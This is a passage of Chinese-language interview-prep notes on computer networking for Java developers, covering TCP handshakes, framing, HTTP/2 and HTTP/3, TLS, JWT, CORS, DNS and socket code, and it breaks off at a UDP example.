## 第一系列：网络模型与 TCP 基础

### 第1集：OSI七层模型 vs TCP/IP四层模型，实际项目中如何理解？

**💡 核心回答：**

OSI 七层模型是理论参考模型，TCP/IP 四层模型是实际使用的协议栈。面试中建议用 TCP/IP 四层模型来讲，再说明 OSI 的对应关系。

| TCP/IP 四层 | OSI 七层 | 核心协议/技术 |
|---|---|---|
| 应用层 | 应用层 + 表示层 + 会话层 | HTTP、HTTPS、DNS、FTP |
| 传输层 | 传输层 | TCP、UDP |
| 网络层 | 网络层 | IP、ICMP、ARP |
| 网络接口层 | 数据链路层 + 物理层 | Ethernet、Wi-Fi |

**📦 实际例子：**

当用户在浏览器输入 `https://pay.example.com` 并发起支付请求时，数据封装过程：

1. **应用层**：浏览器构造 HTTP POST 请求，携带 JSON body `{"amount":100, "merchant":"xxx"}`
2. **传输层**：TCP 将 HTTP 报文切段，加上源端口 49832 和目的端口 443
3. **网络层**：IP 加上源 IP `192.168.1.100` 和目的 IP（DNS 解析后的服务器 IP）
4. **网络接口层**：封装成以太网帧，加上 MAC 地址，通过网卡发出去

每一层对上层透明，应用层不需要关心数据怎么分帧，传输层不需要关心 IP 怎么路由。

**🔍 源码解析：**

在 Java 中，每一层对应不同的 API：

```java
// 应用层 —— 用 OkHttp 发起请求（工作在应用层）
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder()
    .url("https://pay.example.com/api/pay")
    .post(RequestBody.create(jsonBody, MediaType.parse("application/json")))
    .build();
Response response = client.newCall(request).execute();

// 传输层 —— Java Socket 指定端口（工作在传输层）
// TCP 连接由底层操作系统完成三次握手
Socket socket = new Socket("pay.example.com", 443);

// 网络层 —— InetAddress 解析 IP（工作在网络层）
InetAddress address = InetAddress.getByName("pay.example.com");
System.out.println("服务器IP: " + address.getHostAddress());
```

Java 的 `Socket` 类实际是双层设计：Java 层做 API 封装，底层通过 JNI 调用操作系统的 socket 系统调用。

**⚠️ 常见坑/加分回答：**
- OSI 是 ISO 制定的理论标准，从未在工程中完整实现过；TCP/IP 才是真正落地的协议栈
- "表示层"的功能（序列化/加密）在 Java 中通常由应用层代码（Jackson、SSL）完成
- 加分点：可以提 P2P 网络中 DHT（分布式哈希表）跨越了所有层，不完全适合分层模型

### 第2集：TCP 三次握手过程是什么？为什么是三次不是两次？

**💡 核心回答：**

三次握手是 TCP 建立连接的过程，目的是**双方确认彼此的发送和接收能力都正常**。

```
客户端                              服务端
  |                                  |
  |--- SYN(seq=x) ----------------->|   第一次：客户端发起连接请求
  |                                  |
  |<-- SYN+ACK(seq=y, ack=x+1) -----|   第二次：服务端确认并发起自己的连接
  |                                  |
  |--- ACK(ack=y+1) --------------->|   第三次：客户端确认服务端的连接
  |                                  |
  |======== 连接建立，开始传输 =======|
```

为什么不能是两次？两次握手无法防止**历史连接初始化**的问题：

如果客户端之前发的一个 SYN 在网络中滞留了，之后超时重发了新的 SYN 并成功建立连接。如果旧 SYN 到达服务端时只经过两次握手，服务端就会认为这是一个新连接并分配资源，但客户端不会响应，导致服务端资源浪费（半连接泄漏）。三次握手中，客户端在第三步可以不 ACK，服务端就不会建立无效连接。

**📦 实际例子：**

在高并发场景下，服务端大量半连接（只完成一次握手的连接）就是 DDoS 攻击中的 **SYN Flood 攻击**原理。攻击者发送大量 SYN 但不完成第三次握手，耗尽服务端的连接队列。

防御手段：
- **SYN Cookie**：Linux 内核通过 `net.ipv4.tcp_syncookies` 参数开启
- **增大 backlog 队列**：Tomcat 的 `acceptCount` 参数

```java
// Tomcat 的 server.xml 配置
// acceptCount 就是 TCP 全连接队列的大小，默认100
// 当队列满时，新的 TCP 连接会被内核直接拒绝
```

**🔍 源码解析：**

TCP 握手在内核层面完成，但可以从 Java Socket 看到对应的状态变化：

```java
// 客户端
Socket client = new Socket();
// 此时 Socket 处于 CLOSED 状态
client.connect(new InetSocketAddress("127.0.0.1", 8080));
// connect() 调用触发 SYN 发送，等待 SYN+ACK，再发送 ACK
// 三次握手全部在 connect() 内部完成
// connect() 返回时，连接已经建立（ESTABLISHED 状态）

// 服务端
ServerSocket server = new ServerSocket(8080);
// backlog 参数控制半连接队列大小，默认50
Socket accepted = server.accept();
// accept() 从全连接队列中取出一个已完成的连接
// 如果队列为空，accept() 阻塞等待
```

JDK 中 `Socket.connect()` 最终调用 `SocketImpl.connect()`，对于 `PlainSocketImpl`，底层调用的是 `NET_Connect()` 这个 native 方法，即操作系统的 `connect()` 系统调用。三次握手完全由 TCP/IP 协议栈（内核态）完成。

**⚠️ 常见坑/加分回答：**
- 三次握手建立的是**逻辑连接**，不是物理连接，本质是双方交换初始序列号（ISN）
- ISN 的生成算法是安全关键：Linux 使用 MD5 哈希（基于时钟、IP、端口等），防止序列号预测攻击
- `server.accept()` 返回的 Socket 和 `ServerSocket` 是不同角色：`ServerSocket` 负责监听，返回的 `Socket` 负责通信

### 第3集：TCP 四次挥手过程？为什么需要 TIME_WAIT 状态？

**💡 核心回答：**

四次挥手是 TCP 断开连接的过程，因为 TCP 是**全双工**通信，每个方向的关闭需要独立确认。

```
主动关闭方                          被动关闭方
  |                                  |
  |--- FIN(seq=u) ----------------->|   第一次：主动方发送 FIN，表示不再发数据
  |                                  |
  |<-- ACK(ack=u+1) ----------------|   第二次：被动方确认收到 FIN
  |                                  |
  |       （被动方可能还要发剩余数据）   |
  |                                  |
  |<-- FIN(seq=w) ------------------|   第三次：被动方也发 FIN，表示也不再发数据
  |                                  |
  |--- ACK(ack=w+1) --------------->|   第四次：主动方确认被动方的 FIN
  |                                  |
  |    （主动方进入 TIME_WAIT，等2MSL） |
  |                                  |
```

为什么是四次不是三次？因为 TCP 是全双工的，收到对方的 FIN 只表示对方不再发数据了，但我可能还有数据要发。所以 ACK 和 FIN 不能合并（不同于三次握手中 SYN+ACK 可以合并）。

**TIME_WAIT 存在的三个原因：**
1. **保证最后一个 ACK 能到达被动方**：如果 ACK 丢了，被动方会重发 FIN，主动方在 TIME_WAIT 状态下可以重传 ACK
2. **让网络中残余的报文自然消亡**：等待 2MSL（Maximum Segment Lifetime，通常 60 秒），确保旧连接的报文不会干扰新连接
3. **确保连接双方都正确关闭**：被动方收到最后的 ACK 后进入 CLOSED 状态

**📦 实际例子：**

在短连接高并发场景下（比如频繁创建 HTTP 连接调用第三方 API），服务端会出现大量 TIME_WAIT 状态的连接：

```bash
# 排查 TIME_WAIT 连接数
netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

# 典型输出：
# ESTABLISHED  150
# TIME_WAIT    8000   <-- 大量 TIME_WAIT！
# CLOSE_WAIT   5
```

解决方案：
- 使用 HTTP 长连接（`Connection: keep-alive`）减少连接创建/销毁频率
- Linux 内核参数调优：

```bash
# /etc/sysctl.conf
net.ipv4.tcp_tw_reuse = 1     # 允许 TIME_WAIT 状态的端口被复用（仅客户端有效）
net.ipv4.tcp_fin_timeout = 30 # 缩短 FIN_WAIT2 超时时间
```

**🔍 源码解析：**

Java 中优雅关闭连接的实践：

```java
Socket socket = new Socket("example.com", 8080);
// ... 数据传输完成

// socket.close() 的行为取决于 SO_LINGER 设置
// 默认情况（SO_LINGER 未设置）：close() 立即返回，发送 FIN，后台线程负责四次挥手
socket.close();

// 设置 SO_LINGER 后的行为：
socket.setSoLinger(true, 10); // linger 时间 10 秒
socket.close();
// 此时 close() 会阻塞，直到：
// 1. 所有数据发送完毕且对方确认 → 正常四次挥手
// 2. 超过 10 秒 → 发送 RST 强制关闭（丢弃未发送数据）

// 半关闭：只关闭一个方向
socket.shutdownOutput(); // 发送 FIN，不再发送数据，但可以继续接收
socket.shutdownInput();  // 不再接收数据
```

在 JDK 源码中，`Socket.close()` 调用链为 `Socket.close() → impl.close() → PlainSocketImpl.socketClose()`，这是一个 native 方法，最终调用操作系统 `close()` 或 `shutdown()` 系统调用。

**⚠️ 常见坑/加分回答：**
- **TIME_WAIT 是主动关闭方的状态**，被动关闭方没有 TIME_WAIT
- **CLOSE_WAIT 是被动关闭方的状态**，如果 CLOSE_WAIT 大量堆积，说明应用层代码没有正确调用 `close()`，是 bug
- 高并发服务端通常**不应该主动关闭连接**，而是让客户端来关闭，避免服务端堆积 TIME_WAIT
- `SO_LINGER` 设置为非零值时，`close()` 会阻塞，在 Web 容器中慎用

### 第4集：TCP 粘包/拆包是什么？如何解决？

**💡 核心回答：**

TCP 是**面向字节流**的协议，没有消息边界的概念。发送方发送的多个消息可能被接收方一次性读取（粘包），一个消息也可能被分多次读取（拆包）。

原因：
1. **发送端**：TCP 的 Nagle 算法可能将多个小包合并成大包发送
2. **接收端**：应用层读取缓冲区不及时，多个包的数据堆在接收缓冲区中
3. **传输中**：MSS（最大报文段长度）限制导致大包被拆分

**📦 实际例子：**

假设客户端连续发送两条消息：

```java
// 客户端：连续发送两条消息
OutputStream out = socket.getOutputStream();
out.write("Hello".getBytes());
out.write("World".getBytes());

// 服务端可能出现的情况：
byte[] buffer = new byte[1024];
int len = in.read(buffer);
// 可能一次读到 "HelloWorld"（粘包）
// 也可能第一次读到 "Hel"，第二次读到 "loWorld"（拆包）
```

**解决方案：**

| 方案 | 说明 | 示例 |
|---|---|---|
| 固定长度 | 每个消息固定 100 字节，不够补齐 | 简单但浪费带宽 |
| 分隔符 | 用特殊字符标记消息边界（如换行符） | HTTP 的 `\r\n` |
| 长度字段 | 消息头包含消息体长度 | **最常用**，Netty 的 `LengthFieldBasedFrameDecoder` |

**🔍 源码解析：**

Netty 的 `LengthFieldBasedFrameDecoder` 是解决粘包拆包的经典实现：

```java
// 协议设计：
// +--------+--------+----------------+
// | 长度(4B) | 类型(1B) |   数据(N字节)   |
// +--------+--------+----------------+

// Netty Pipeline 配置
pipeline.addLast(new LengthFieldBasedFrameDecoder(
    65535,    // maxFrameLength: 最大帧长度
    0,        // lengthFieldOffset: 长度字段的偏移量
    4,        // lengthFieldLength: 长度字段占4字节
    0,        // lengthAdjustment: 长度修正值
    4         // initialBytesToStrip: 跳过的字节数（跳过长度字段本身）
));
pipeline.addLast(new MyBusinessHandler());
```

核心逻辑在 `decode()` 方法中，Netty 会：
1. 检查 `ByteBuf` 中可读字节数是否 ≥ 长度字段偏移 + 长度字段长度
2. 读取长度字段值，得到消息体实际长度
3. 检查可读字节数是否 ≥ 消息头 + 消息体总长度
4. 如果不够，抛出 `NOT_ENOUGH_DATA`，等待下次 `channelRead` 再试
5. 如果够了，截取完整的消息帧传递给下一个 Handler

```java
// Netty 源码片段：LengthFieldBasedFrameDecoder.decode()
@Override
protected Object decode(ChannelHandlerContext ctx, ByteBuf in) throws Exception {
    // 第一次调用时，尝试解码长度字段
    if (discardingTooLongFrame) {
        // 上一帧超长，丢弃直到找到边界
        ...
    }

    // 确保能读到长度字段
    if (in.readableBytes() < lengthFieldEndOffset) {
        return null; // 数据不够，等下次 channelRead
    }

    // 读取消息体长度
    long frameLength = getUnadjustedFrameLength(in, actualLengthFieldOffset, lengthFieldLength, lengthAdjustment);

    // 检查是否超过最大帧长度
    if (frameLength > maxFrameLength) {
        longBytesToDiscard = frameLength + lengthFieldEndOffset;
        // 标记需要丢弃的帧
        ...
    }

    // 等待完整帧到达
    if (in.readableBytes() < frameLength + lengthFieldEndOffset) {
        return null; // 帧不完整，等下次
    }

    // 截取完整帧，传递给下一个 Handler
    ByteBuf frame = extractFrame(ctx, in, in.readerIndex() + initialBytesToStrip, (int) frameLength);
    in.skipBytes((int) frameLength + lengthFieldEndOffset);
    return frame;
}
```

**⚠️ 常见坑/加分回答：**
- HTTP/1.1 用 `Content-Length` 头解决消息边界问题；HTTP 分块传输用 `Transfer-Encoding: chunked` 解决
- Netty 还提供了 `DelimiterBasedFrameDecoder`（分隔符方案）和 `LineBasedFrameDecoder`（行分隔符方案）
- 面试加分：可以讲 gRPC 基于 HTTP/2，HTTP/2 本身有帧机制，不需要额外处理粘包

## 第二系列：HTTP 协议族

### 第5集：HTTP/1.1、HTTP/2、HTTP/3 的核心区别是什么？

**💡 核心回答：**

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| 传输协议 | TCP | TCP | **QUIC（基于UDP）** |
| 多路复用 | ❌（队头阻塞） | ✅（流级别多路复用） | ✅（无 TCP 队头阻塞） |
| 头部压缩 | ❌ | ✅（HPACK） | ✅（QPACK） |
| 服务器推送 | ❌ | ✅ | ✅ |
| 连接建立 | TCP握手+TLS握手 | TCP握手+TLS握手 | **0-RTT/1-RTT** |
| 二进制分帧 | ❌（文本协议） | ✅ | ✅ |

**📦 实际例子：**

场景：一个网页加载需要请求 50 个资源（HTML + CSS + JS + 图片）

- **HTTP/1.1**：浏览器对同一域名最多开 6 个连接（Chrome），50 个资源排队，每个连接串行请求。加上 TCP 三次握手 + TLS 握手的开销，首屏可能要 2-3 秒
- **HTTP/2**：一个 TCP 连接上开 50 个 Stream，并行传输所有资源。二进制分帧让不同资源的数据帧交错传输，大幅减少延迟
- **HTTP/3**：用 QUIC（UDP）替代 TCP，不仅没有 TCP 队头阻塞（一个 Stream 丢包不影响其他 Stream），而且 QUIC 的连接建立只需 0-RTT 或 1-RTT

**🔍 源码解析：**

Java 11+ 内置了 HTTP/2 客户端支持：

```java
// Java 11 HttpClient 原生支持 HTTP/2
HttpClient client = HttpClient.newBuilder()
    .version(HttpClient.Version.HTTP_2) // 优先使用 HTTP/2
    .build();

HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create("https://example.com/api/data"))
    .GET()
    .build();

// 同步请求
HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

// 异步请求
client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
    .thenApply(HttpResponse::body)
    .thenAccept(System.out::println);
```

Java 的 `HttpClient` 在 HTTP/2 模式下，底层自动管理 Stream 的多路复用。对于 OkHttp 4.x，从 3.x 开始也支持 HTTP/2，底层依赖 Okio 的二进制帧处理。

**⚠️ 常见坑/加分回答：**
- HTTP/2 的多路复用解决了 HTTP 层面的队头阻塞，但**没有解决 TCP 层面的队头阻塞**（一个 TCP 包丢了，所有 Stream 都要等）
- HTTP/3 的 QUIC 解决了 TCP 队头阻塞，因为每个 Stream 独立，一个丢了只影响那一个 Stream
- Spring Boot 3.x 内嵌的 Tomcat 10+ 默认支持 HTTP/2，但需要 HTTPS（HTTP/2 标准要求）
- 面试加分：可以提 Google 在 Chrome 中测试发现 HTTP/3 比 HTTP/2 快 5%-15%

### 第6集：HTTPS 的 TLS 握手流程是怎样的？（TLS 1.2 和 1.3 的区别）

**💡 核心回答：**

HTTPS = HTTP + TLS。TLS 在 TCP 连接建立之后、HTTP 通信之前完成握手，目的是：
1. **身份认证**：客户端验证服务端身份（通过证书）
2. **密钥协商**：双方协商出一个对称加密的会话密钥
3. **加密通信**：后续 HTTP 数据都使用会话密钥加密

**TLS 1.2 握手流程（2-RTT）：**

```
客户端                                         服务端
  |                                              |
  |--- ClientHello ----------------------------->|   第1次：
  |    (支持的TLS版本、加密套件列表、             |   客户端告诉服务端自己支持什么
  |     客户端随机数 ClientRandom、              |
  |     支持的扩展)                              |
  |                                              |
  |<--- ServerHello -----------------------------|   第2次：
  |     (选定的TLS版本、加密套件、               |   服务端选定参数
  |      服务端随机数 ServerRandom、             |
  |      会话ID/SessionTicket)                   |
  |                                              |
  |<--- Certificate -----------------------------|   第3次：
  |     (服务端证书链，含公钥)                    |   服务端证明"我是谁"
  |                                              |
  |<--- ServerKeyExchange（可选）----------------|   第4次：
  |<--- ServerHelloDone ------------------------|   服务端参数传完了
  |                                              |
  |--- ClientKeyExchange ----------------------->|   第5次：
  |    (用服务端公钥加密的 Pre-Master Secret)    |   客户端生成预主密钥
  |                                              |
  |--- ChangeCipherSpec ----------------------->|   第6次：
  |--- Finished(握手摘要) ---------------------->|   客户端切换到加密模式
  |                                              |
  |<--- ChangeCipherSpec -----------------------|   第7次：
  |<--- Finished(握手摘要) ----------------------|   服务端也切换到加密模式
  |                                              |
  |========= 握手完成，开始加密传输 ===============|
```

双方各自用 `ClientRandom + ServerRandom + Pre-Master Secret` 计算出相同的**会话密钥（Master Secret）**，后续通信全部用这个对称密钥加密。

**TLS 1.3 握手流程（1-RTT，甚至 0-RTT）：**

TLS 1.3 大幅简化了握手：
- 移除了不安全的加密套件（RSA 密钥交换、CBC 模式等），只保留 AEAD（如 AES-GCM、ChaCha20-Poly1305）
- 服务端在 ServerHello 中就发送证书和密钥交换参数
- 客户端在收到 ServerHello 后就可以开始发送加密数据（1-RTT）

```
客户端                                         服务端
  |                                              |
  |--- ClientHello ----------------------------->|
  |    (支持的加密套件、密钥共享参数 KeyShare、    |
  |     支持的签名算法、PSK)                      |
  |                                              |
  |<--- ServerHello + EncryptedExtensions -------|
  |     + Certificate + CertificateVerify        |
  |     + Finished                               |   服务端一次性返回所有信息
  |                                              |
  |--- Finished -------------------------------->|   客户端验证证书后直接完成
  |                                              |
  |========= 握手完成（1-RTT）====================|
```

**📦 实际例子：**

在 Nginx 上配置 TLS 1.3：

```nginx
server {
    listen 443 ssl;
    ssl_certificate     /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    # 只允许 TLS 1.2 和 1.3
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # 优先使用服务端的加密套件
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    
    # 开启 OCSP Stapling 加速证书验证
    ssl_stapling on;
    ssl_stapling_verify on;
}
```

**🔍 源码解析：**

Java 中 HTTPS 连接底层使用 `SSLSocket`，握手过程自动完成：

```java
// 方式一：通过 URL 直接建立 HTTPS 连接（底层自动 TLS 握手）
URL url = new URL("https://api.example.com/data");
HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
// getInputStream() 时会自动触发 TLS 握手
// 包括证书验证、密钥协商，全部由 JSSE（Java Secure Socket Extension）处理
InputStream in = conn.getInputStream();

// 方式二：手动创建 SSLSocket（可以看到更多握手细节）
SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
SSLSocket sslSocket = (SSLSocket) factory.createSocket("api.example.com", 443);

// 添加握手监听器，观察握手过程
sslSocket.addHandshakeCompletedListener(event -> {
    System.out.println("TLS 握手完成！");
    System.out.println("协议版本: " + event.getSession().getProtocol());   // TLSv1.3
    System.out.println("加密套件: " + event.getSession().getCipherSuite()); // TLS_AES_256_GCM_SHA384
    System.out.println("会话ID: " + Arrays.toString(event.getSession().getId()));
});

sslSocket.startHandshake(); // 手动触发握手（不调用则首次读写时自动触发）
```

JSSE（Java Secure Socket Extension）的实现在 `sun.security.ssl` 包中：
- `SSLSocketImpl` 处理 TLS 协议逻辑
- `Handshaker` 负责握手流程（`ClientHandshaker` / `ServerHandshaker`）
- `CertificateMessage` 处理证书解析和验证
- `CipherBox` 封装加密解密操作

**⚠️ 常见坑/加分回答：**
- TLS 1.2 使用 `PRF`（伪随机函数，基于 HMAC）派生密钥；TLS 1.3 使用 `HKDF`（基于 HMAC 的密钥派生函数），更安全
- TLS 1.3 中 `Finished` 消息的 HMAC 密钥不再是 Master Secret，而是从 handshake traffic secret 派生的
- 0-RTT 数据（TLS 1.3）有重放攻击风险，不应该用于非幂等操作（比如支付请求）
- 面试加分：TLS 1.3 移除了 RSA 密钥交换，只保留了 ECDHE/DHE，实现了**前向安全性（Forward Secrecy）**

### 第7集：Cookie、Session、Token、JWT 有什么区别？怎么选？

**💡 核心回答：**

| 方案 | 存储位置 | 安全性 | 跨域 | 无状态 | 典型场景 |
|---|---|---|---|---|---|
| Cookie | 浏览器 | 一般（XSS/CSRF 风险） | ❌（同源策略） | ❌ | 传统 Web 登录 |
| Session | 服务端 | 较好 | ❌ | ❌（需要 Session 存储） | 传统 Web 应用 |
| Token（如 UUID） | 客户端+服务端 | 较好 | ✅ | ❌（需要校验） | REST API |
| JWT | 客户端（自包含） | 取决于实现 | ✅ | ✅（无需服务端存储） | 微服务/前后端分离 |

**📦 实际例子：**

**场景1：传统 Web 应用（Session）**

```java
// Spring Boot 中 Session 的使用
@PostMapping("/login")
public String login(@RequestParam String username, @RequestParam String password,
                    HttpSession session) {
    // 验证用户名密码...
    if (authenticate(username, password)) {
        session.setAttribute("user", username);  // 存入 Session
        session.setMaxInactiveInterval(30 * 60); // 30分钟过期
        return "redirect:/dashboard";
    }
    return "redirect:/login?error";
}

// Session ID 默认通过 Cookie 传递给浏览器
// 浏览器每次请求自动带上 JSESSIONID=xxx
```

**场景2：前后端分离应用（JWT）**

```java
// 使用 JJWT 库生成和验证 JWT
// pom.xml: io.jsonwebtoken:jjwt-api:0.12.5

// 生成 JWT（登录接口）
@PostMapping("/api/login")
public Map<String, String> login(@RequestBody LoginRequest req) {
    // 验证用户...
    String jwt = Jwts.builder()
        .subject("user123")                          // 用户标识
        .claim("role", "ADMIN")                       // 自定义声明
        .issuedAt(new Date())                          // 签发时间
        .expiration(new Date(System.currentTimeMillis() + 3600000)) // 1小时过期
        .signWith(Keys.hmacShaKeyFor(secretKeyBytes), Jwts.SIG.HS256) // HMAC-SHA256 签名
        .compact();

    return Map.of("token", jwt);
}

// 验证 JWT（拦截器）
public class JwtAuthInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) {
        String token = request.getHeader("Authorization").replace("Bearer ", "");
        try {
            Claims claims = Jwts.parser()
                .verifyWith(Keys.hmacShaKeyFor(secretKeyBytes))
                .build()
                .parseSignedClaims(token)
                .getPayload();

            String userId = claims.getSubject();
            String role = claims.get("role", String.class);
            request.setAttribute("userId", userId);
            return true;
        } catch (JwtException e) {
            response.setStatus(401);
            return false;
        }
    }
}
```

**🔍 源码解析：**

JWT 的结构是三段 Base64URL 编码，用 `.` 连接：

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiJ9.             ← Header: {"alg":"HS256"}
eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6IkFETUlOIn0. ← Payload: {"sub":"user123","role":"ADMIN"}
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature: HMAC-SHA256(Header.Payload, Secret)
```

签名验证过程：服务端用同样的 Secret 对 `Header.Payload` 做 HMAC-SHA256，与 JWT 中的 Signature 对比，一致则说明数据未被篡改。

**⚠️ 常见坑/加分回答：**
- **JWT 一旦签发无法主动失效**（除非引入黑名单机制），所以过期时间不要设太长
- JWT 的 Payload 是 Base64 编码，**不是加密**，不要放敏感信息（如密码）
- JWT + Redis 黑名单方案：用户登出时将 JWT 的 jti（JWT ID）加入 Redis，过期时间与 JWT 一致
- Session 方案在分布式环境下需要 Session 共享（Spring Session + Redis）
- 面试加分：Cookie 的安全属性 —— `HttpOnly`（防 XSS 窃取）、`Secure`（仅 HTTPS 传输）、`SameSite`（防 CSRF）

### 第8集：跨域问题（CORS）是怎么产生的？怎么解决？

**💡 核心回答：**

浏览器的**同源策略**限制了从一个源（协议+域名+端口）的网页向另一个源发起 AJAX 请求。这是安全机制，防止恶意网站读取其他网站的数据。

注意：**跨域限制只存在于浏览器中**，后端服务之间（如微服务调用）没有跨域问题。

CORS（Cross-Origin Resource Sharing）通过 HTTP 头告诉浏览器"我允许某个源访问我"。

**📦 实际例子：**

前端 `http://localhost:3000` 请求后端 `http://localhost:8080/api/users`

```
浏览器发送的请求：
GET /api/users HTTP/1.1
Host: localhost:8080
Origin: http://localhost:3000      ← 浏览器自动带上 Origin 头

后端返回的响应：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://localhost:3000    ← 告诉浏览器允许这个源
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

Spring Boot 中配置 CORS：

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://www.example.com")  // 允许的源
            .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
            .allowedHeaders("*")
            .allowCredentials(true)                      // 允许携带 Cookie
            .maxAge(3600);                               // 预检结果缓存1小时
    }
}
```

**🔍 源码解析：**

对于**非简单请求**（如 `Content-Type: application/json` 或带自定义 Header），浏览器会先发一个 **OPTIONS 预检请求**：

```
OPTIONS /api/users HTTP/1.1
Host: localhost:8080
Origin: http://localhost:3000
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

后端响应：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

预检通过后，浏览器才发送真正的请求。`maxAge` 指定预检结果缓存时间，避免每次请求都发 OPTIONS。

在 Spring 中，`CorsFilter`（或 `DispatcherServlet`）会检查请求的 `Origin` 头，匹配 `CorsConfiguration` 规则，然后设置响应头。源码在 `DefaultCorsProcessor.processRequest()` 方法中。

**⚠️ 常见坑/加分回答：**
- `Access-Control-Allow-Origin: *` 和 `allowCredentials(true)` **不能同时使用**，浏览器会报错
- 生产环境中 `allowedOrigins` 不要写 `*`，应该指定具体域名
- Nginx 反向代理也可以解决跨域（前端请求同域 Nginx，Nginx 转发到不同域后端）
- JSONP 是古老的跨域方案（利用 `<script>` 标签不受同源策略限制），现在基本被 CORS 替代

## 第三系列：DNS 与网络编程

### 第9集：DNS 解析的完整过程是什么？如何优化？

**💡 核心回答：**

DNS（Domain Name System）将域名解析为 IP 地址，解析过程是一个多级查询：

```
浏览器输入 www.example.com
    ↓
1. 浏览器缓存（Chrome 自己的 DNS 缓存）
    ↓ 未命中
2. 操作系统缓存（/etc/hosts 或 nscd 缓存）
    ↓ 未命中
3. 本地 DNS 服务器（ISP 提供，如 114.114.114.114）
    ↓ 未命中
4. 根 DNS 服务器（13组，.root-servers.net）→ 返回 .com 顶级域地址
    ↓
5. 顶级域 DNS 服务器（.com）→ 返回 example.com 权威 DNS 地址
    ↓
6. 权威 DNS 服务器（example.com 的 DNS）→ 返回 www.example.com 的 IP
    ↓
7. 各级缓存记录 TTL，逐级返回
```

**📦 实际例子：**

```bash
# 查看 DNS 解析过程（可以看到每一级的查询）
dig www.example.com +trace

# 查看某个域名的 DNS 记录
dig www.example.com A        # A 记录：域名→IPv4
dig www.example.com AAAA     # AAAA 记录：域名→IPv6
dig www.example.com CNAME    # CNAME 记录：域名→另一个域名（别名）
dig www.example.com MX       # MX 记录：邮件服务器
```

DNS 优化手段：
1. **DNS 预解析**：`<link rel="dns-prefetch" href="//api.example.com">`
2. **HTTPDNS**：用 HTTP 请求代替本地 DNS 查询，避免 LocalDNS 的劫持和调度不精准（阿里云 HTTPDNS、腾讯 HTTPDNS）
3. **缩短 TTL**：DNS 记录 TTL 设短一些（如 300 秒），IP 变更时快速生效

**🔍 源码解析：**

Java 中 DNS 解析通过 `InetAddress` 类完成：

```java
// 域名解析为 IP
InetAddress[] addresses = InetAddress.getAllByName("www.example.com");
for (InetAddress addr : addresses) {
    System.out.println(addr.getHostAddress()); // 如 93.184.216.34
}

// 自定义 DNS 解析器（Java 9+）
// 可以通过 SPI 机制替换默认 DNS 解析器
// 实现 java.net.spi.InetAddressResolverProvider
```

Java 的 DNS 缓存行为：
- **正缓存**（成功解析的结果）：默认缓存时间由 DNS 响应的 TTL 决定，但如果 TTL < `networkaddress.cache.ttl`，则用后者。如果 `networkaddress.cache.ttl` 未设置，则对成功解析的结果永久缓存（JVM 生命周期内）
- **负缓存**（解析失败的结果）：默认缓存 10 秒，可通过 `networkaddress.cache.negative.ttl` 设置

**⚠️ 常见坑/加分回答：**
- Java 中 DNS 解析成功后的结果会**永久缓存**（直到 JVM 退出），如果域名对应的 IP 变了（如故障切换），Java 应用感知不到。解决方案：设置 `networkaddress.cache.ttl=60`（缓存60秒后重新解析）
- `InetAddress.getByName()` 在缓存未命中时会触发同步 DNS 查询，可能阻塞数秒。在高并发场景下需要注意
- 加分点：gRPC 的 DNS 解析支持 SRV 记录和 TXT 记录，可以实现客户端负载均衡

### 第10集：Socket 编程基础，Java 如何实现 TCP 和 UDP 通信？

**💡 核心回答：**

Socket 是网络编程的基础抽象，代表一个双向通信端点，由 IP 地址 + 端口号 唯一标识。

- **TCP Socket**：面向连接、可靠、有序 → 适合文件传输、消息通信
- **UDP Socket（DatagramSocket）**：无连接、不可靠、快速 → 适合视频直播、DNS 查询

**📦 实际例子：**

TCP 通信示例 —— 简单的 echo 服务：

```java
// 服务端
public class EchoServer {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(9090);
        System.out.println("Echo 服务启动，监听端口 9090");

        while (true) {
            Socket client = serverSocket.accept(); // 阻塞等待客户端连接
            // 为每个客户端创建独立线程处理
            new Thread(() -> {
                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(client.getInputStream()));
                     PrintWriter out = new PrintWriter(client.getOutputStream(), true)) {

                    String message;
                    while ((message = in.readLine()) != null) {
                        System.out.println("收到: " + message);
                        out.println("Echo: " + message); // 原样返回
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    try { client.close(); } catch (IOException e) {}
                }
            }).start();
        }
    }
}

// 客户端
public class EchoClient {
    public static void main(String[] args) throws IOException {
        try (Socket socket = new Socket("127.0.0.1", 9090);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(
                 new InputStreamReader(socket.getInputStream()))) {

            out.println("Hello Server");
            System.out.println("收到回复: " + in.readLine()); // Echo: Hello Server
        }
    }
}
```

UDP 通信示例：

```java
// UDP 发送端
